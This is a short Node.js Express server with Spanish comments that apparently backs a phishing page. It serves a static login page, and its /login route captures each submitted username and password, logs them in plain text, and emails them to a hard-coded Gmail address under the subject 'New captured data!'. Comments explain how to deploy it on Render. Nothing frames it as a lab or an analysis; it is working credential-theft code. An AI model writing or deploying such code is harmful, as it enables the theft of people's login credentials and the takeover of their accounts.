require('dotenv').config();

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path'); // Importante para las rutas de archivos

const app = express();
app.use(cors());
app.use(bodyParser.json());

// --- 1. CONFIGURACIÓN PARA MOSTRAR TU PÁGINA WEB ---
// Esto le dice al servidor que busque el index.html en la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// --- 2. CONFIGURACIÓN DE TU CORREO ---
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'paschasin1234@gmail.com', // Tu correo
        pass: process.env.GMAIL_PASSWORD       // Tu contraseña de aplicación
    }
});

// --- RUTA PARA RECIBIR LOS DATOS ---
app.post('/login', (req, res) => {
    const { usuario, password } = req.body;

    console.log(`Datos recibidos: ${usuario} / ${password}`);

    const mailOptions = {
        from: 'paschasin1234@gmail.com', 
        to: 'paschasin1234@gmail.com',   // A donde llega la info
        subject: '¡Nuevos datos capturados!',
        text: `Se han enviado nuevos datos del formulario:\n\nUsuario: ${usuario}\nContraseña: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.status(500).send('Error al enviar el correo');
        } else {
            console.log('Correo enviado: ' + info.response);
            res.status(200).send('Datos recibidos y correo enviado');
        }
    });
});

// --- 3. PUERTO DINÁMICO (CRUCIAL PARA RENDER) ---
// Render te asigna un puerto automáticamente en la variable process.env.PORT
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});